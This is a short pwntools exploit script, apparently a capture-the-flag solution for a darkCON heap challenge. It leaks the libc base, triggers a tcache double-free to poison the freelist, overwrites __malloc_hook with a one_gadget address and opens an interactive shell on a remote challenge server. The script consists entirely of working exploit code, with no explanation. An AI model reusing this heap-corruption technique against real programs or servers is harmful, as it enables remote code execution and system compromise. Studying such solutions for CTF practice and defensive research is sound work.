#flag = darkCON{shrtflg}
from pwn import *

elf = ELF("./a.out")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
target = process([elf.path, ld.path], env={"LD_PRELOAD": libc.path})
target = remote('65.1.92.179', 49155)

def sla(s, d):
	target.sendlineafter(s, d)

def create(idx, size, data):
	sla("[3] - exit", "1")
	sla(":", str(idx))
	sla(":", str(size))
	sla(":", data)

def delete(idx):
	sla("[3] - exit", "2")
	sla(":", str(idx))

gadgets = [0x4f365, 0x4f3c2, 0x10a45c]

target.recvuntil("gift: ")
libc_base = int(target.recvline().strip(), 0x10) - (0x7f15fd1355b0 - 0x00007f15fd07f000)
create(0, 0x20, "A"*8)
create(1, 0x20, "A"*8)
create(2, 0x20, "A"*8)
create(3, 0x20, "A"*8)
delete(2)
delete(1)
delete(0)
delete(1)
create(1, 0x20, p64(libc_base + libc.sym['__malloc_hook']))
create(1, 0x20, "JUNK")
create(1, 0x20, "JUNK")
create(1, 0x20, p64(libc_base + gadgets[1]))
create(1, 0x20, "JUNK")

target.interactive()